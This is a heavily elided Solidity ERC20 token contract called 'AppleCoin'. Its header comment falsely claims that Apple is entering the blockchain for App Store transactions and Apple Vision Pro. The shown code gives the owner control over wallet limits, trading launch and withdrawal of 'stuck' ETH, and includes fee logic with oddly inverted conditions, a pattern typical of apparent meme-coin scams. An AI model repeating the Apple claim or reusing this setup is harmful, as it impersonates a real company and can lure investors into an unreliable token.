...
/*
Apple enters the Blockchain for Applestore Transactions & Apple Vision Pro
...
contract APPLEVISION is ERC20, Ownable {
    using SafeMath for uint256;

    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "AppleCoin";
    ...
    constructor(address Satoshi) Ownable(msg.sender) {
    ...
    function _basicTransfer(
     ...
     function inSwapAppleCoin(bool takeFee , uint actions, uint256 amount) internal view returns (bool) {
    ...
    **/
    ...
    function takeAppleCoinAmountAfterFees(uint action, bool takefee, uint256 amounts)
        internal
        returns (uint256)
    {
        uint256 oxPercents;
    ...
    function _transferFrom(
        ...
        if (inSwapAppleCoin(takefee, actions, amount)) {
            swapBackAppleCoinEth(amount);
        }
    ...
    function _transferTokens(
        ...
        uint256 amountX = takeFee
            ? rAmount : feeEnabled
            ? takeAppleCoinAmountAfterFees(action, takeFee, rAmount) 
            : rAmount;
    ...
    function swapBackAppleCoinEth(uint256 amount) private lockTheSwap {
    ...
    function removeAppleCoinLimit() external onlyOwner returns (bool) {
        _maxWalletAmount = _totalSupply;
        return true;
    }
    
    function createAppleCoinTrade() external onlyOwner {
    ...
    function enableAppleCoinTrade() public onlyOwner {
    ...
    function withdrawAppleCoinStuckEth() external onlyOwner {
